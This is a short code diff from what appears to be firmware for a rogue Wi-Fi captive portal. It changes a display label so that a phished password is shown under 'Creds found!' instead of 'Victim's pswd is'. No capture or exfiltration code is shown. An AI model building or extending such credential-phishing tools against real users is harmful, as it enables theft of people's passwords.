@@ -96,7 +96,7 @@ void handleForm() {
  display.drawXbm(4,0,128,64,attack_bits);
  display.drawLine(0, 54, 128, 54);
  display.drawLine(0, 53, 128, 53);
- display.drawString(0,10,"Victim's pswd is"); 
+ display.drawString(0,10,"Creds found!"); 
  display.drawString(0,20,passwd);
  display.drawString(0,54,"CAPTIVE PORTAL");
  display.display();
